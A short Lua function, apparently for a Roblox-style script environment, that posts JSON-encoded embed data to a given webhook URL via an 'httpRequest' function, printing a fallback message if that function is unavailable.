local function sendEmbed(webhookUrl, embedData)
    if httpRequest then
        httpRequest({
            Url = webhookUrl,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(embedData)
        })
    else
        print("Bruh")
    end
end

